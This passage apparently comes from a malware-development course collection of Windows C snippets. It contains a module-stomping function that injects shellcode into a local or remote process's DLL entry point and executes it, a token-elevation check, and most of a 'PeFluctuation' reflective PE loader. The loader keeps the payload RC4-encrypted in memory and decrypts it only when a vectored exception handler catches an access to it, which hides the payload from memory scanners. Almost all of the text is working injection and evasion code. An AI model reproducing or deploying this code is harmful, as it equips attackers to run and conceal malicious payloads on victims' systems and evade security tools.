							sNmbrOfBytesWritten			= NULL;
	ULONG_PTR				uLocalMappedAdd				= NULL,
							uRemoteMappedAdd			= NULL,
							uLocalEntryPntAdd			= NULL,
							uRemoteEntryPntAdd			= NULL,
							uTextSectionAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs					= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr					= NULL;
	DWORD					dwOldProtection				= 0x00;
	BOOL					bRemoteInjection			= hProcess == NtCurrentProcess() ? FALSE : TRUE;

	if (!hProcess || !szSacrificialDllPath || !pShellcodeBuffer || !sShellcodeLength || !phThread)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	wsprintfW(szNtPathDll, L"\\??\\\\%s", szSacrificialDllPath);
	RtlInitUnicodeString(&UnicodeStr, szNtPathDll);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hFile) {
		printf("[!] NtCreateFile Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Mapping The Sacrificial DLL Into Local Process For PE Parsing ...");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, NtCurrentProcess(), &uLocalMappedAdd, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, bRemoteInjection ? PAGE_READONLY : PAGE_EXECUTE_READWRITE)))) {
		printf("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] DONE \n");
	printf("[*] Mapped At: 0x%p \n", uLocalMappedAdd);

	if (!bRemoteInjection)
		printf("[i] Using The Same Map View For Module Stomping (Local Injection) \n");

	else {
		printf("[i] Mapping The Sacrificial DLL Into Remote Process ...");
		if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, hProcess, &uRemoteMappedAdd, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)))) {
			printf("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			goto _END_OF_FUNC;
		}
		printf("[+] DONE \n");
		printf("[*] Mapped At: 0x%p \n", uRemoteMappedAdd);
	}

	// Fetch Nt Headers
	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uLocalMappedAdd + ((PIMAGE_DOS_HEADER)uLocalMappedAdd)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	// Fetch Entry Point
	uLocalEntryPntAdd	= uLocalMappedAdd + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
	uRemoteEntryPntAdd	= uRemoteMappedAdd + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

	// Fetch Section Header
	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
			uTextSectionAddress		= uLocalMappedAdd + pImgSecHdr[i].VirtualAddress;
			sTextSectionSize		= pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}

	if (!uTextSectionAddress || !sTextSectionSize)
		goto _END_OF_FUNC;

	// Calculate the size between the entry point and the end of the text section.
	sTextSizeLeft = sTextSectionSize - (uLocalEntryPntAdd - uTextSectionAddress);

	printf("[i] Payload Size: %d Byte\n", sShellcodeLength);
	printf("[i] Available Memory (Starting From The EP): %d Byte\n", sTextSizeLeft);

	if (sShellcodeLength > sTextSizeLeft) {
		printf("[!] Shellcode Is Too Big For The Available Memory! \n");
		goto _END_OF_FUNC;
	}

	if (bRemoteInjection) {
		printf("[i] Unmapping Local View (Remote Injection) ...");
		if (!NT_SUCCESS((STATUS = g_NtApi.pNtUnmapViewOfSection(NtCurrentProcess(), uLocalMappedAdd)))) {
			printf("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
			goto _END_OF_FUNC;
		}
		uLocalMappedAdd = NULL;
		printf("[+] DONE \n");
	}

	printf("[i] Injecting Payload At 0x%p - (%s)\n", bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, bRemoteInjection ? "Remote Entry Point" : "Local Entry Point");

	printf("[i] Writing Payload ...");
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, bRemoteInjection ? &uRemoteEntryPntAdd : &uLocalEntryPntAdd, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, pShellcodeBuffer, sShellcodeLength, &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sShellcodeLength) {
		printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sShellcodeLength);
		goto _END_OF_FUNC;
	}
	printf("[+] DONE \n");

	printf("[i] Executing Payload ...");
	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(phThread, THREAD_ALL_ACCESS, NULL, hProcess, bRemoteInjection ? uRemoteEntryPntAdd : uLocalEntryPntAdd, NULL, 0x00, 0x00, 0x00, 0x00, NULL))) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}
	printf("[+] DONE \n");
	printf("[*] Payload Executed With Thread Of ID: %d \n", GetThreadId(*phThread));

_END_OF_FUNC:
	DELETE_HANDLE(hFile);
	DELETE_HANDLE(hSection);
	if (bRemoteInjection && uLocalMappedAdd)
		g_NtApi.pNtUnmapViewOfSection(NtCurrentProcess(), uLocalMappedAdd);
	return *phThread ? TRUE : FALSE;
}
```
### Check Token Elevation Status Via NtQueryInformationToken
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);

BOOL IsTokenElevated(IN HANDLE hToken) {

    NTSTATUS                    STATUS                      = 0x00;
    TOKEN_ELEVATION             TknElvtion                  = { 0 };
    DWORD                       dwLength                    = sizeof(TOKEN_ELEVATION);
    fnNtQueryInformationToken   pNtQueryInformationToken    = NULL;
    BOOL                        bTokenIsElevated            = FALSE;

    if (!hToken)
        return FALSE;

    if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenElevation, &TknElvtion, dwLength, &dwLength)) == 0x00)
        bTokenIsElevated = TknElvtion.TokenIsElevated;

    return bTokenIsElevated;
}
```
### PeFluctuation
```c
#include <windows.h>
#include <stdio.h>

#define		RC4_KEY_SIZE				0x10	// 16 bytes
#define		EXEC_WAIT					1		// 1 Second - This constant is used as the time before encrypting the PE file. In other words, the PE will be exposed (to run) in memory for EXEC_WAIT seconds.

// ==========================================================================================================================================================

typedef struct _OBF_INFO
{
	ULONG_PTR	uPeRXBaseAddress;
	SIZE_T		sPeRXRegionSize;
	HANDLE		hTimer;
	HANDLE		hTimerQueue;

} OBF_INFO, *POBF_INFO;

typedef struct _PE_HDRS
{
	PBYTE					pFileBuffer;
	DWORD					dwFileSize;

	PIMAGE_NT_HEADERS		pImgNtHdrs;
	PIMAGE_SECTION_HEADER	pImgSecHdr;

	PIMAGE_DATA_DIRECTORY	pEntryImportDataDir;
	PIMAGE_DATA_DIRECTORY	pEntryBaseRelocDataDir;
	PIMAGE_DATA_DIRECTORY	pEntryTLSDataDir;
	PIMAGE_DATA_DIRECTORY	pEntryExceptionDataDir;
	PIMAGE_DATA_DIRECTORY	pEntryExportDataDir;

} PE_HDRS, *PPE_HDRS;


typedef struct _PE_FLUCTUATION
{
	struct _OBF_INFO	ObfInfo;
	struct _PE_HDRS		PeHdrs;

} PE_FLUCTUATION, * PPE_FLUCTUATION;

#define STATUS_SUCCESS	    0x00000000
#define NtCurrentProcess()  ( (HANDLE)-1 )
#define NtCurrentThread()   ( (HANDLE)-2 )
#define NT_SUCCESS(STATUS)	(((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

typedef struct _USTRING {

	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING, * PUSTRING;


typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG_PTR ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
typedef NTSTATUS(NTAPI* fnSystemFunction032)(PUSTRING Data, PUSTRING Key);

typedef struct _NT_API
{
	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory;
	fnSystemFunction032			pSystemFunction032;

}NT_API, *PNT_API;


// ==========================================================================================================================================================
/* global structure variables */

NT_API		g_Nt			= { 0 };
POBF_INFO	g_pObfInfo		= NULL;

// ==========================================================================================================================================================
/* Hint: you can use HellsHall instead */

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_Nt.pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	g_Nt.pNtProtectVirtualMemory	= (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	g_Nt.pSystemFunction032			= (fnSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");

	if (!g_Nt.pNtAllocateVirtualMemory || !g_Nt.pNtProtectVirtualMemory || !g_Nt.pSystemFunction032)
		return FALSE;
	else
		return TRUE;
}

// ==========================================================================================================================================================
// ==========================================================================================================================================================
/* Hint: you can use 'FixImportAddressTable' from Module 31: Building A PE Packer */

BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress) {

	PIMAGE_IMPORT_DESCRIPTOR	pImgDescriptor		= NULL;

	for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);
		if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
			break;

		LPSTR		cDllName				= (LPSTR)(pPeBaseAddress + pImgDescriptor->Name);
		ULONG_PTR	uOriginalFirstThunkRVA	= pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR	uFirstThunkRVA			= pImgDescriptor->FirstThunk;
		SIZE_T		ImgThunkSize			= 0x00;
		HMODULE		hModule					= NULL;

		if (!(hModule = LoadLibraryA(cDllName))) {
			printf("[!] LoadLibraryA Failed Loading %s With Error: %d \n", cDllName, GetLastError());
			return FALSE;
		}

		while (TRUE) {

			PIMAGE_THUNK_DATA			pOriginalFirstThunk		= (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA			pFirstThunk				= (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME		pImgImportByName		= NULL;
			ULONG_PTR					pFuncAddress			= NULL;

			if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))) {
					printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else {
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name))) {
					printf("[!] Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;
			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
		}
	}

	return TRUE;
}

// ==========================================================================================================================================================
// ==========================================================================================================================================================
/* Hint: you can use 'FixReloc' from Module 31: Building A PE Packer */

typedef struct _BASE_RELOCATION_ENTRY {
	WORD	Offset : 12;
	WORD	Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


BOOL FixReloc(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress) {

	PIMAGE_BASE_RELOCATION	pImgBaseRelocation		= (pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);
	ULONG_PTR				uDeltaOffset			= pPeBaseAddress - pPreferableAddress;
	PBASE_RELOCATION_ENTRY	pBaseRelocEntry			= NULL;

	while (pImgBaseRelocation->VirtualAddress) {

		pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
			switch (pBaseRelocEntry->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				printf("[!] Unknown relocation type: %d | Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
				return FALSE;
			}
			pBaseRelocEntry++;
		}

		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
	}

	return TRUE;
}


// ==========================================================================================================================================================
// ==========================================================================================================================================================
/* Hint: you can use 'Rc4EncryptDecrypt' from Module 31: Building A PE Packer */



BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN SIZE_T sBufferLen) {

	NTSTATUS				STATUS					= STATUS_SUCCESS;
	BYTE					Rc4Key[RC4_KEY_SIZE]	= { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
	USTRING					uStrBuffer				= { .Buffer = pBuffer,  .Length = sBufferLen,	.MaximumLength = sBufferLen };
	USTRING					uStrKey					= { .Buffer = Rc4Key,   .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };
	DWORD					dwOldProtection			= 0x00;

	if (!pBuffer || !sBufferLen)
		return FALSE;

	/* change memory permissions to RW to be able to encrypt/decrypt */
	if (!NT_SUCCESS(STATUS = g_Nt.pNtProtectVirtualMemory(NtCurrentProcess(), &pBuffer, &sBufferLen, PAGE_READWRITE, &dwOldProtection))) {
		printf("[!] NtProtectVirtualMemory [RW] Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	/* encrypt or decrypt the payload */
	if ((STATUS = g_Nt.pSystemFunction032(&uStrBuffer, &uStrKey)) != STATUS_SUCCESS) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}


// ==========================================================================================================================================================
// ==========================================================================================================================================================


VOID CALLBACK ObfuscationTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired) {

	NTSTATUS		STATUS				= STATUS_SUCCESS;
	DWORD			dwOldProtection		= 0x00;

	/* encrypt the payload */
	Rc4EncryptDecrypt(g_pObfInfo->uPeRXBaseAddress, g_pObfInfo->sPeRXRegionSize);

	/* set memory permissions to RO */
	if (!NT_SUCCESS(STATUS = g_Nt.pNtProtectVirtualMemory(NtCurrentProcess(), &g_pObfInfo->uPeRXBaseAddress, &g_pObfInfo->sPeRXRegionSize, PAGE_READONLY, &dwOldProtection))) {
		printf("[!] NtProtectVirtualMemory [RO] Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}
}


// ==========================================================================================================================================================
// ==========================================================================================================================================================

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {

	NTSTATUS		STATUS				= STATUS_SUCCESS;
	DWORD			dwOldProtection		= 0x00;


	/* check the exception code */
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {

		/* check the exception address. if the exception address is coming from inside of the .text section, it's handled */
		if (pExceptionInfo->ExceptionRecord->ExceptionAddress >= g_pObfInfo->uPeRXBaseAddress && pExceptionInfo->ExceptionRecord->ExceptionAddress <= (g_pObfInfo->uPeRXBaseAddress + g_pObfInfo->sPeRXRegionSize)) {

			if (!g_pObfInfo->hTimerQueue|| !g_pObfInfo->hTimer)
				goto _FAILURE;

			/* decrypt the payload */
			if (!Rc4EncryptDecrypt(g_pObfInfo->uPeRXBaseAddress, g_pObfInfo->sPeRXRegionSize))
				goto _FAILURE;

			/* set memory permissions to RX */
			if (!NT_SUCCESS(STATUS = g_Nt.pNtProtectVirtualMemory(NtCurrentProcess(), &g_pObfInfo->uPeRXBaseAddress, &g_pObfInfo->sPeRXRegionSize, PAGE_EXECUTE_READ, &dwOldProtection))) {
				printf("[!] NtProtectVirtualMemory [RX] Failed With Error: 0x%0.8X \n", STATUS);
				goto _FAILURE;
			}

			/* execute the 'ObfuscationTimerCallback' function after 'EXEC_WAIT' seconds */
			if (!CreateTimerQueueTimer(&g_pObfInfo->hTimer, g_pObfInfo->hTimerQueue, (WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00)) {
				printf("[!] CreateTimerQueueTimer Failed With Error: %d \n", GetLastError());
				goto _FAILURE;
			}

			// Continue execution
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}

	printf("[-] Unhandled Exception [Code: 0x%0.8X] [Address: 0x%p]\n", pExceptionInfo->ExceptionRecord->ExceptionCode, pExceptionInfo->ExceptionRecord->ExceptionAddress);

_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}


// ==========================================================================================================================================================
// ==========================================================================================================================================================


BOOL InjectPeFluctuation(IN ULONG_PTR uPePayloadBaseAddress, IN DWORD dwPePayloadLength, OUT OPTIONAL PPE_FLUCTUATION* ppPeFluctioationInfo) {

	NTSTATUS			STATUS						= STATUS_SUCCESS;
	BOOL				bResult						= FALSE;
	ULONG_PTR			uPeBaseAddress				= NULL;
	SIZE_T				sRegionSize					= 0x00,
						sTmpSizeVar					= 0x00;
	PPE_FLUCTUATION		pPeFlucStr					= NULL;
	PVOID				pVectoredExptnHandler		= NULL,
						pEntryPoint					= NULL;


	if (!uPePayloadBaseAddress || !dwPePayloadLength)
		return FALSE;

	if (!(pPeFlucStr = LocalAlloc(LPTR, sizeof(PE_FLUCTUATION)))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	pPeFlucStr->PeHdrs.pFileBuffer	= (PBYTE)uPePayloadBaseAddress;
	pPeFlucStr->PeHdrs.dwFileSize	= dwPePayloadLength;
	pPeFlucStr->PeHdrs.pImgNtHdrs	= (PIMAGE_NT_HEADERS)(pPeFlucStr->PeHdrs.pFileBuffer + ((PIMAGE_DOS_HEADER)pPeFlucStr->PeHdrs.pFileBuffer)->e_lfanew);

	if (pPeFlucStr->PeHdrs.pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	if (pPeFlucStr->PeHdrs.pImgNtHdrs->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
		printf("[!] 32-Bit Payloads Are Not Supported \n");
		goto _END_OF_FUNC;
	}

	if (pPeFlucStr->PeHdrs.pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) {
		printf("[!] DLL Payloads Are Not Supported \n");
		goto _END_OF_FUNC;
	}

	sRegionSize = sTmpSizeVar					= pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.SizeOfImage;
	pPeFlucStr->PeHdrs.pImgSecHdr				= IMAGE_FIRST_SECTION(pPeFlucStr->PeHdrs.pImgNtHdrs);
	pPeFlucStr->PeHdrs.pEntryImportDataDir		= &pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeFlucStr->PeHdrs.pEntryBaseRelocDataDir	= &pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeFlucStr->PeHdrs.pEntryTLSDataDir			= &pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	pPeFlucStr->PeHdrs.pEntryExceptionDataDir	= &pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeFlucStr->PeHdrs.pEntryExportDataDir		= &pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	/* initialize syscall function pointers */
	if (!InitializeSyscallsStruct())
		goto _END_OF_FUNC;

	/* allocate memory for the pe payload */
	if (!NT_SUCCESS((STATUS = g_Nt.pNtAllocateVirtualMemory(NtCurrentProcess(), &uPeBaseAddress, 0x00, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	/* calculate entry point */
	pEntryPoint = (PVOID)(uPeBaseAddress + pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	/* copy pe sections */
	for (int i = 0; i < pPeFlucStr->PeHdrs.pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		memcpy(
			(PVOID)(uPeBaseAddress + pPeFlucStr->PeHdrs.pImgSecHdr[i].VirtualAddress),
			(PVOID)(pPeFlucStr->PeHdrs.pFileBuffer + pPeFlucStr->PeHdrs.pImgSecHdr[i].PointerToRawData),
			pPeFlucStr->PeHdrs.pImgSecHdr[i].SizeOfRawData
		);
	}

	/* fixing the import address table */
	if (!FixImportAddressTable(pPeFlucStr->PeHdrs.pEntryImportDataDir, uPeBaseAddress))
		goto _END_OF_FUNC;

	/* resolving pe relocations */
	if (!FixReloc(pPeFlucStr->PeHdrs.pEntryBaseRelocDataDir, uPeBaseAddress, pPeFlucStr->PeHdrs.pImgNtHdrs->OptionalHeader.ImageBase))
		goto _END_OF_FUNC;

	/* setting up suitable memory permissions */
	for (DWORD i = 0; i < pPeFlucStr->PeHdrs.pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD		dwProtection		= 0x00,
					dwOldProtection		= 0x00;
		PVOID		pSectionAddress		= (PVOID)(uPeBaseAddress + pPeFlucStr->PeHdrs.pImgSecHdr[i].VirtualAddress);
		SIZE_T		sSectionSize		= (SIZE_T)pPeFlucStr->PeHdrs.pImgSecHdr[i].SizeOfRawData;

		if (!pPeFlucStr->PeHdrs.pImgSecHdr[i].SizeOfRawData || !pPeFlucStr->PeHdrs.pImgSecHdr[i].VirtualAddress)
			continue;

		if (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		/* if memory is RX, we save its base address and size */
		if ((pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)) {

			if (!pPeFlucStr->ObfInfo.uPeRXBaseAddress)
				pPeFlucStr->ObfInfo.uPeRXBaseAddress	= uPeBaseAddress + pPeFlucStr->PeHdrs.pImgSecHdr[i].VirtualAddress;
			if (!pPeFlucStr->ObfInfo.sPeRXRegionSize)
				pPeFlucStr->ObfInfo.sPeRXRegionSize		= pPeFlucStr->PeHdrs.pImgSecHdr[i].SizeOfRawData;

			dwProtection = PAGE_EXECUTE_READ;
		}

		if ((pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pPeFlucStr->PeHdrs.pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!NT_SUCCESS(STATUS = g_Nt.pNtProtectVirtualMemory(NtCurrentProcess(), &pSectionAddress, &sSectionSize, dwProtection, &dwOldProtection))) {
			printf("[!] NtProtectVirtualMemory Failed At Address 0x%p With Error: 0x%0.8X \n", pSectionAddress, STATUS);
			goto _END_OF_FUNC;
		}
	}

	if (!pPeFlucStr->ObfInfo.uPeRXBaseAddress || !pPeFlucStr->ObfInfo.sPeRXRegionSize)
		goto _END_OF_FUNC;

	/* set exception handlers of the payload (if detected) */
	if (pPeFlucStr->PeHdrs.pEntryExceptionDataDir->Size) {
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(uPeBaseAddress + pPeFlucStr->PeHdrs.pEntryExceptionDataDir->VirtualAddress);

		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeFlucStr->PeHdrs.pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), uPeBaseAddress))
			printf("[!] RtlAddFunctionTable Failed With Error: %d \n", GetLastError());
	}

	/* register pefluctuation veh */
	if (!(pVectoredExptnHandler = AddVectoredExceptionHandler(0x01, VectoredExceptionHandler))) {
		return FALSE;
	}

	/* execute tls callbacks (if detected) */
	if (pPeFlucStr->PeHdrs.pEntryTLSDataDir->Size) {

		PIMAGE_TLS_DIRECTORY	pImgTlsDirectory	= (PIMAGE_TLS_DIRECTORY)(uPeBaseAddress + pPeFlucStr->PeHdrs.pEntryTLSDataDir->VirtualAddress);
		PIMAGE_TLS_CALLBACK*	pImgTlsCallback		= (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
		CONTEXT					pCtx				= { 0x00 };

		for (int i = 0; pImgTlsCallback[i] != NULL; i++)
			pImgTlsCallback[i]((LPVOID)uPeBaseAddress, DLL_PROCESS_ATTACH, &pCtx);
	}

	printf("[i] Performing PE Fluctuation on: 0x%p [ %ld ]\n", pPeFlucStr->ObfInfo.uPeRXBaseAddress, pPeFlucStr->ObfInfo.sPeRXRegionSize);
	printf("[*] Executing Entry Point: 0x%p \n\n", pEntryPoint);

	/* creates a queue for timers */
